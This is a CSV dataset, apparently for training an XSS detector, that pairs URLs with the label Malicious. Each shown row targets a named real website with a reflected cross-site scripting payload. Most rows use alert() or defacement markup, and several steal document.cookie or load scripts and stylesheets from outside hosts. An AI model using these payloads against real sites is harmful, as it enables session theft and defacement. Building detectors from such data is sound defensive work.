Sentence,Type
http://www.nvidia.co.jp/content/driverdownload/download_confirmation_jp.asp?language=jp&amp;url=%22%3e%3<br>cscript%3ealert(/xss/)%3c/script%3e%3ca,Malicious
http://u-dvd.mgf5.com/ranklink186/ranklink.cgi?id=%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://enclub.a-joho.net/pc/index.php?agid=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.jbb.jpn.org/ranklink.cgi?id=%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.ruvr.ru/index.php?lng=pek&amp;w=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.874117.com/?action=login&amp;agid=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://gec.a-joho.net/pc/index.php?agid=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.fm123.com/radio_detail.php?radio_id=&quot;&gt;&lt;iframe&gt;&lt;/iframe&gt;,Malicious
http://channel.patzzi.joins.com/channel/testzone/test_aa.asp?seq=%22%3e%3ciframe%20src=/%3e%3c/ifram<br>e%3e,Malicious
http://chinese.joins.com/gb/article.do?method=%22%3e%3ciframe%20src=./%3e%3c/iframe%3e,Malicious
http://world.kbs.co.kr/english/news/news_po_detail.htm?no=%22%3e%3ciframe%20src=/%3e%3c/iframe%3e,Malicious
http://www.pic.to/alert/input?url=%22%3e%3ciframe%20src%3d%2f%3e%3c%2fiframe%3e,Malicious
http://idol.mp3torrent.org/%22%3e%3ciframe%3e%3c/iframe%3e/index.html,Malicious
http://image.uyghurqq.com/url.asp?url=xss.jpg&quot;&gt;&lt;iframe%20src=../&gt;&lt;/iframe&gt;,Malicious
http://www.heso-click.com/items/?kw=%22%3e%3ciframe%20src=/%3e%3c/iframe%3e,Malicious
http://japanese.joins.com/search/japanese.php?query=kim%22%3e%3ciframe%20src=//www.google.com/%3e%3c<br>/iframe%3e,Malicious
http://mail-cafe.tv/p/top/index2.php?c=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.nj1937.org/play.asp?realfilepath=%22%3e%3ciframe/src=127.0.0.1l%3e%3c/iframe%3e,Malicious
http://news.onekoreanews.net/bbs_detail.php?bbs_num=8&amp;tb=board_notice&amp;b_category=%22%3e%3cscript%3ea<br>lert(/xss/)%3c/script%3e,Malicious
http://news.onekoreanews.net/html_file.php?file=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://metablog.onekoreanews.net/index.php?type=all&amp;keyword=%22%3e%3cscript%3ealert(/xss/)%3c/script<br>%3e,Malicious
http://h.ula.cc/dance/?kenken=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://same.ula.cc/test/r.so/%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.mad.tv/search/index.php?searchwords=&lt;script&gt;alert('dont get mad!')&lt;/script&gt;,Malicious
http://content.basspro.com/misc/createaccountwarning.cfm?firstname=test&lt;script&gt;alert('xss');&lt;/script<br>&gt;,Malicious
http://www.blague.info/blagues/vannes-67.html?cat=67/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.100blagues.com/login?lusername=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;lpassword=xss&amp;authenticate=1,Malicious
http://www.club.it.porsche.com/downloadfile.php?fileposizione=%22%3e%3cscript%3ealert(1)%3c/script%3<br>e,Malicious
http://www.yildizelicpl.k12.tr/sinif.asp?sinif=&quot;&gt;&lt;script&gt;alert(&quot;drakula&quot;)&lt;/script&gt;,Malicious
http://www.pakistan.gov.pk/mindivredirect.jsp?name=xss%20by%20zombie_ksa%20|%20mr.lonely420@hotmail.<br>com%27%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=%27http://loverzpoint.info/5<br>5.js%27%3e%3c/script%3e,Malicious
http://www.download.com/9241-2248_4-10731856.html?messageid=10129207,Malicious
http://www.tekmanx.net/sitede_ara.asp?ara=%3cscript%3ealert(%27drakula%27)%3c/script%3e,Malicious
http://www.caglarkoyu.com/sitede_ara.asp?ara=&lt;script&gt;alert('drakula')&lt;/script&gt;,Malicious
http://videos.emule.com/download.php?id=3lmmcyxe5k0&amp;eurl=&amp;titulo=%22%3e%3cscript%3ealert(document.co<br>okie)%3c/script%3e,Malicious
http://strtc.oracle.com/imtapp/console/cns_download.jsp?file=%22%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious
https://shop.medical.philips.com/phstore/catalog/cssearch.asp?type=product&amp;srch=&lt;script&gt;alert('draku<br>la')&lt;/script&gt;,Malicious
http://www.istanbulbarosu.org.tr/linkindex1.asp?src=%3cscript%3ealert(%27drakula%27)%3c%2fscript%3e&amp;<br>all=y&amp;id=1,Malicious
http://www.jmhuberinstitute.org/detail.asp?id=&lt;script&gt;alert('drakula')&lt;/script&gt;,Malicious
http://www.jmfinancialservices.in/search.asp?err=nr&amp;strt=&lt;script&gt;alert('drakula')&lt;/script&gt;,Malicious
http://www.gitarakor.com/ara.asp?q=&lt;script&gt;alert('drakula')&lt;/script&gt;://,Malicious
http://www.discountedscripts.com/demos/videonew/list.php?q=%3cscript%3ealert(%27drakula%27)%3c/scrip<br>t%3e,Malicious
http://www.mcdonalds.com.tr/reklamlar.asp?mainid=3&amp;subid=3&amp;item=%22%3e%3cscript%3ealert(%27drakula%2<br>7)%3c/script%3e%3cmarquee%3e%3ch1%3edafeced%20by%20drakula%3c/h1%3e%3c/marquee%3e,Malicious
http://www.videofeedscript.com/list.php?q=%3cscript%3ealert(%27drakula%27)%3c/script%3e,Malicious
http://www.kappastore.com/it/errore.asp?messaggio=&quot;&gt;&lt;script&gt;alert('drakula')&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;da<br>feced by drakula&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.aeg.electrolux.com.tr/node128.asp?query=%22%3e%3cscript%3ealert(%27drakula%27)%3c/script%<br>3e,Malicious
http://www.beyazonline.com/beyaz-show-videolarini-izle.asp?no=1&amp;baslik=%22%3e%3cscript%3ealert(%27dr<br>akula%27)%3c/script%3e,Malicious
http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
http://www.wsc.com.bs/admin/default.asp?msg=%22%3e%3cscript%3ealert(%27bkrdra%27)%3c/script%3e,Malicious
http://geonames.nga.mil/names/request.asp?request=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://gamestats.gamespy.com/actofwarht/rank.asp?nick=%22%3e%3cscript%3ealert(document.cookie)%3c/sc<br>ript%3e,Malicious
http://www.devletarsivleri.gov.tr/katalog/sifre.asp?kadi=&quot;&gt;&lt;script&gt;alert('drakula')&lt;/script&gt;,Malicious
http://meinestadt.msn.de/x/popup_engine.php?toinclude=event.php&amp;single=4940925&amp;location=79260&amp;start_<br>time=10.03.2007+00%3a00&amp;popup=1&amp;advertisement=1&amp;title=&quot;&gt;&lt;script&gt;alert(&quot;akincilar&quot;)&lt;/script&gt;,Malicious
http://www.msn.de/mobile/pocketpc/mobwetfo.asp?sid=&quot;&gt;&lt;script&gt;alert(&quot;xssedcicosz&quot;)&lt;/script&gt;,Malicious
http://elperiodico.com/buscador.asp?criteri=algo%22/%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.wildpornreview.com/exits/exitpop.php?popurl=%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.seg-social.es/internet_1/busquedas/index.htm?ssusertext=%3cscript%3ealert(1)%3c/script%3e<br>%3c%2fh2%3e&amp;fragment1_nextrow=&amp;xgisstema=0&amp;lang=es&amp;buscar=+buscar,Malicious
http://www.karlosnet.com/general/buscador.php?busc=%3cscript%3ealert(1)%3c%2fscript%3e&amp;i=0&amp;image.x=0<br>&amp;image.y=0,Malicious
http://mitele.telecinco.es/buscador/index.shtml?text=algo%22%3e%3cscript%3ealert(1)%3c%2fscript%3e&amp;x<br>=0&amp;y=0,Malicious
http://www.grupmassoler.com/paginas/seleccio.php?lang=/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;tipoprom=2,Malicious
http://www.unitech-international.org/unitech%5csearch.nsf/valldocs?searchview&amp;query=algo%22%3e%3cscr<br>ipt%3ealert(%22xss%22)%3c/script%3e*&amp;searchorder=1&amp;count=10&amp;start=0,Malicious
http://cercador.gencat.cat/cercador/appjava/index.jsp?q=%3c%2ftitle%3e%3cscript%3ealert%28%27xss%27%<br>29%3c%2fscript%3e&amp;submit=cerca+%3e&amp;as_sitesearch=http%3a%2f%2fwww10.gencat.net%2fagaur_web&amp;site=defa<br>ult_collection&amp;idioma=,Malicious
http://www.tmb.net/ca_es/barcelona/moute/planols/lineametroplano.jsp?linia=3%22%20%3cscript%3ealert(<br>'xss')%3c/script%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v4/forums/default.aspx?boardid=3&amp;theme=%22%3e%3cscript%3ealert<br>('by encore')%3c/script%3e,Malicious
http://keepvid.com/?url=http%3a%2f%2fvideo.google.com%2fvideoplay%3fdocid%3d-8714206094109801742%26q<br>%3dtrack%2barte%2bmain%2b2007%26ei%3d1rawsmg3gi382wkwzqqy%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(13<br>37)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/boutique/vie-privee.asp?theme=%22%3e%3cscript%3ealert('by<br>encore')%3c/script%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenom-arabe-email.asp?prenom=%22%3e%3cscri<br>pt%3ealert('by encore')%3c/script%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-nom-de-famille/nom.asp?nom=&quot;&gt;&lt;body+onload=alert(&quot;s<br>tarxt&quot;)&gt;&lt;marquee&gt;&lt;h1&gt;st@rext&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenom.asp?prenom=&quot;&gt;&lt;body+onload=alert(&quot;sta<br>rext&quot;)&gt;&lt;marquee&gt;&lt;h1&gt;st@rext&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://notrefamille.femmes.fr.msn.com/v2/boutique/produit-prenom.asp?pastrouve=true&amp;prenom=&quot;&gt;&lt;body+o<br>nload=alert(&quot;starext&quot;)&gt;&lt;marquee&gt;&lt;h1&gt;st@rext&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenoms-de-celebrites.asp?prenom=%22%3e%3cl<br>ink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/genealogie-recherche/recherche-generale.asp?nom=%22%3e%3cma<br>rquee%3e%3ch1%3estarext%3c/h1%3e%3c/marquee%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/boutique2/parchemin-origine-du-nom-de-famille2.asp?lastname<br>=%22%3e%3clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/membres/identification.asp?theme=notrefamille&amp;service=forum<br>&amp;redirect=%22%3e%3clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/membres/mot_de_passe_oublie.asp?service=genealogie-en-ligne<br>&amp;methode=email&amp;email=%22%3e%3clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesh<br>eet%3e&amp;reponse=nontrouve,Malicious
http://notrefamille.femmes.fr.msn.com/v2/membres-inscription/saisie-coordonnees.asp?origine_inscript<br>ion=&amp;service=forums&amp;theme=notrefamille&amp;redirect=%22%3e%3clink%20href=http://starext.by.ru/css.css%20<br>type=text/css%20rel=stylesheet%3e,Malicious
http://www.warez-portalz.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e,Malicious
http://www.dzit.gov.sa/en/search.php?q=%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscrip<br>t%3e&amp;x=14&amp;y=11,Malicious
http://www.podclass.com/podclass/course/search.php?tag=%3c%3cscript%3ealert(%22resistance%22);//%3c%<br>3c/script%3e,Malicious
http://blogs.sfweekly.com/search.php?tag=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e%3<br>cimg%20src=%20%22http://img406.imageshack.us/img406/448/rahmisfm9.png%22%3e6--%3e,Malicious
http://www.fullversionreleases.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/scri<br>pt%3e,Malicious
http://test.sp2000.org/search_results.php?search_string=&lt;&lt;script&gt;alert(&quot;resistance&quot;);//&lt;&lt;/script&gt;,Malicious
http://www.vads.ac.uk/results.php?cmd=search&amp;words==%22%3e%3cscript%3ealert(%22resistance%22)%3c/scr<br>ipt%3e,Malicious
http://www.albkomunitet.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cook<br>ie)%3c/script%3e,Malicious
http://www.kinyona.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.myhollywoodspace.biz/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.<br>cookie)%3c/script%3e,Malicious
http://www.2coolcode.com/cgi-bin/ourspace/login.cgi?command=%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://dongbb.org/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e,Malicious
http://plaque-gravee-moins-chere.com/gravure-sur-plaque/achat/recherche.php?motclef=f%3cimg%20src=%2<br>0%22http://img406.imageshack.us/img406/448/rahmisfm9.png%22%3e6--%3e,Malicious
http://www.yahell.net/cgi-bin/ourspace/login.cgi?&amp;command=%22%3e%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.busrates.com/results.php?page=1&amp;city=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/scri<br>pt%3e,Malicious
http://games.playzone.co.il/search.php?q=%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscr<br>ipt%3e&amp;x=41&amp;y=7,Malicious
http://www.consum8.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e,Malicious
http://www.2amicro.com/boutique/achat/recherche.php?motclef=%3c%3cscript%3ealert(%22resistance%22);/<br>/%3c%3c/script%3e,Malicious
http://pdki.org/lang.php?lang=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://phonebook.adamswells.com/results.php?cmd=1&amp;name=%3cimg+%22%22%22%3e%3cscript%3ealert(%22resis<br>tance%22)%3c%2fscript%3e%22%3e&amp;city=all&amp;x=0&amp;y=0,Malicious
http://www.coopercenter.org/search.php?s=%3c%2ftitle%3e%3cscript%3ealert%28%22resistance%22%29%3b%3c<br>%2fscript%3e,Malicious
http://www.bio-produits.com/vente/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
http://www.dynavive.eu/boutique/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.dominiquemary.fr/panier/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
"http://newsroom.cisco.com/newsroom/flash/evp/?vidid=';alert(string.fromcharcode(83,69,67,85,82,73,84<br>,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(str<br>ing.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,8<br>2,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
http://www.banbooo.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscript%3<br>e,Malicious
http://projeep.co.il/search.php?q=+%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscript%3e<br>+,Malicious
http://www.coral.co.il/rinunim/search.php?q=+%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2<br>fscript%3e+,Malicious
http://www.ecartproduction.net/commande/achat/recherche.php?motclef=%3c%3cscript%3ealert(%22resistan<br>ce%22);//%3c%3c/script%3e,Malicious
http://tools.cisco.com/elearning/knet/faq/jsp/faqcontroller.jsp?motclef=%3c%3cscript%3ealert(%22resistan<br>,Malicious
http://forums.cisco.com/eforum/servlet/viewsflash?setcookie=1&amp;cmd=showform&amp;pollid=cdcweb01!cdc_gener<br>al_feedback%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by<br>%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://local.sanfrancisco.com/search.pg?z=san+francisco&amp;q=%27%22%3e%3c/title%3e%3cscript%3ealert(133<br>7)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://resources.cisco.com/app/error.taf?_function=errorreturn&amp;errormessage=&lt;script&gt;alert('www.sec-r<br>1z.com')&lt;/script&gt;,Malicious
http://ca.eshop.sonyericsson.com/advanced_search_result.php?keywords=&quot;/&gt;&lt;script&gt;alert(/xss:<br>vijayendra/)&lt;/script&gt;&amp;x=20&amp;y=10,Malicious
http://www.sonyericsson.com/xperianordic/index-modal.php?cc=se&amp;lc=sv&amp;item=%22%3e%3cscript%3ealert%28<br>%27longrifle0x%27%29%3c/script%3e,Malicious
http://www.challenges.fr/recherche/?q=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;&lt;script<br>type=&quot;text/javascript&quot; src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,Malicious
http://annuaire.pro/ajouter.asp?categoo=achat&amp;mail=xss&amp;nomm=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;<br>src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,Malicious
http://www.lsa-conso.fr/recherche=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;?sort=pertinence,Malicious
http://www.achatcommerce.com/recherche.php?dep=&amp;ref=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;categorie=0&amp;mot_cle<br>s=%2f&amp;prix=&amp;type=&amp;x=50&amp;y=20,Malicious
http://www.mlowreyengraving.com/search.php?searchfor=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.immobiliarediamante.com/ricerca-immobile.php?sezione=%22%3e%3cscript%3ealert%28document.c<br>ookie%29;%3c/script%3e%3c%22&amp;tipo_imm=0&amp;prezzo_min=0&amp;x=77&amp;y=6,Malicious
http://www.ascension-tech.com/searchresults.asp?searwords=%27%27%3balert%28%271%27%29%3bvar+asd%3d%2<br>7&amp;go.x=12&amp;go.y=12,Malicious
http://www.lactualite.com/resultat-recherche?cx=012041515408509556353%3axuc9fskx5ca&amp;cof=forid%3a11&amp;i<br>e=utf-8&amp;as_q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;op.x=24&amp;op.y=9&amp;form_build_id=form-c07fb0b98a3297ca2b7df5e94c8edb6c&amp;form_id=search<br>_theme_form,Malicious
http://barmafia.free.fr/dlm/download.php?id=363/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.novagora.net/rub.php?idr=4/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.goingout.ro/wp-content/plugins/comment-rating-pro/ck-processkarma.php?id=16039&amp;action=add<br>&amp;path=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://revistacofradia.com/wp-content/plugins/comment-rating/ck-processkarma.php?id=31&amp;action=add&amp;pa<br>th=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.thejeffwilsonexperience.com/blog/wp-content/plugins/comment-rating/ck-processkarma.php?id<br>=14&amp;action=add&amp;path=&amp;path=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://tradingkstocks.com/b2btest/phpb2b/offer/list.php?do=search&amp;q=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.havreac.com/section.php?id_section=14/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
http://www.ufpl.fr/section.php?id=55/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.pole-lagunes.org/web/view_section.php?id_section=1085&amp;anchorname=1/&quot;&gt;&lt;script&gt;alert(1)&lt;/sc<br>ript&gt;,Malicious
https://www.inderscience.com/offer.php?id=5324/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
http://www.find2trade.com/offer.php?id=81623/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.zenithinfotech.com/search.aspx?searchstr=&lt;script&gt;alert('xssed');&lt;/script&gt;,Malicious
http://einc-player.crim.ca/caption_php/play_this.php?video_url=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.<br>cookie)&lt;/script&gt;,Malicious
http://www.crim.ca/fr/membres/zone_reserve/index.html?action=login&amp;password=1&amp;requestedresource=&lt;/te<br>xtarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;username=1,Malicious
http://www.wunderground.com/statesnowdepth.asp?state=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.wunderground.com/modelmaps/maps.asp?model=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.wunderground.com/global/stations/17244.html?bannertypeclick=&quot;&gt;&lt;script&gt;alert('trex')&lt;/scri<br>pt&gt;,Malicious
http://www.wunderground.com/ci.asp?l=&quot;&gt;&lt;script&gt;alert(&quot;seymenwashere&quot;)&lt;/script&gt;,Malicious
http://french.wunderground.com/global/stations/68588.html?bannertypeclick=big2%27%22%3e%3c/title%3e%<br>3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.1800goguard.com/search/results.php?criteria=&lt;/h2&gt;&lt;script&gt;alert('xss%20by%20mrdoug')&lt;/scri<br>pt&gt;&lt;font%20size=7%20color=red&gt;xss%20by%20mrdoug&lt;/font&gt;,Malicious
http://www4.army.mil/search/index.php?search=%3cscript%3ealert(%22xss%20by%20mrdoug%22)%3c%2fscript%<br>3e,Malicious
http://vip.asus.com/eservice/techservok.aspx?slanguage=en-us&amp;caseid=%3cscript%3ealert(%22xss%20by%20<br>mrdoug%22)%3c/script%3e,Malicious
"http://ncrules.state.nc.us/searchrules.asp?title=%2fncac%2ftitle+11+-+insurance&amp;chapter=&amp;searchcrite<br>ria=%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;returntype=rule",Malicious
http://search.cleveland.com/sp?aff=100&amp;keywords=%22%3e%3c/title%3e%3cscript%3ealert(%22xss%20by%20mr<br>doug%22)%3c/script%3e&amp;x=8&amp;y=7,Malicious
http://www.marines.com/main/search?s=%3c/h1%3e%3cscript%3ealert(%22xss%20by%20mrdoug%22)%3c/script%3<br>e,Malicious
http://ultimate-guitar.com/xtra/click_contest.php?ug_from=main&amp;url=http://www.xssed.com/,Malicious
"http://www.googlealert.com/toolkit_inner.php?u=%22%3e%3cscript%3ealert(string.fromcharcode(88,83,83,<br>32,66,121,32,77,114,68,111,117,103))%3c/script%3e%3cx=%22",Malicious
http://www.rankquest.com/tools/link-popularity.php?url=%3c/textarea%3e%3cscript%3ealert(%22xss%20by%<br>20mrdoug%22)%3c/script%3e,Malicious
http://lcweb2.loc.gov/ammem/browse/listsome.php?timeperiod=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.mytelus.com/search/results.do?p=web&amp;q=%22%3e%3cscript+src%3d%27http%3a//freewebs.com/skun<br>kf00t/x.js%27.%3c/script%3e%3c%21--,Malicious
http://health.mytelus.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(420)%3c/sc<br>ript%3e,Malicious
http://health.mytelus.com/drug_info_details.asp?search_letter=%22%3e%3cscript%3ealert(420)%3c/script<br>%3e,Malicious
http://net-dz.com/all.php?cx=002533184230814951741%3a21ntlwlqrae&amp;q=%22%27%3e%3cscript%3ealert(%27tou<br>ched+by+3n!gma%27)%3b%3c%2fscript%3e&amp;sa.x=39&amp;sa.y=7&amp;ie=utf-8&amp;cof=forid%3a9&amp;itemid=1&amp;gsearch=yes,Malicious
http://lgi.osi.hu/search_results.php?search_mode=1&amp;keyword=%3ciframe+src%3d%22http%3a%2f%2fxssed.com<br>%22%3e&amp;imgfsearch.x=19&amp;imgfsearch.y=10,Malicious
http://www.ua.ac.be/main.aspx?c=*vacatures&amp;n=&quot;'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://kisi.deu.edu.tr/moral/test.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][]=%3cscript%20src=http://hiphopshare.xm.com/xss.js,Malicious
http://www.deu.edu.tr/deuweb/etkinlik/etkinlik.php?etkinlik_no=1259&amp;title=''&gt;&lt;/script&gt;&lt;script&gt;alert(<br>document.cookie)&lt;/script&gt;&lt;h1&gt;xssbynarcoticxs&lt;/h1&gt;,Malicious
http://www.cs.deu.edu.tr/index.php?option=com_remository&amp;itemid=105&amp;func=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://aix.ee.eng.deu.edu.tr/search.php?query=sinav%22%3e%3cscript%3ealert%28%22taberani%22%29%3c%2f<br>script%3e&amp;topic=&amp;category=0&amp;author=&amp;days=0&amp;type=stories,Malicious
http://web.deu.edu.tr/defot/resim.php?sergi=zd&amp;resim=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.hotcdljobs.com/jobs/jobinfo.php?j_id=96394&amp;c_id=132508/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://projetrosette.info/page.php?id=1/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.bn-r.fr/fr/recherche-resultat.php?q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;start=0&amp;rows=&amp;fl=&amp;version=2.2,Malicious
http://demo.oxylustemplates.com/fluxglide-demo/index.php/our-blog/search/?q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
https://secure.acton.org/bookshoppe/main/products.php?words=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.filmsdistribution.com/fd_library_title.php?id_search=3/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
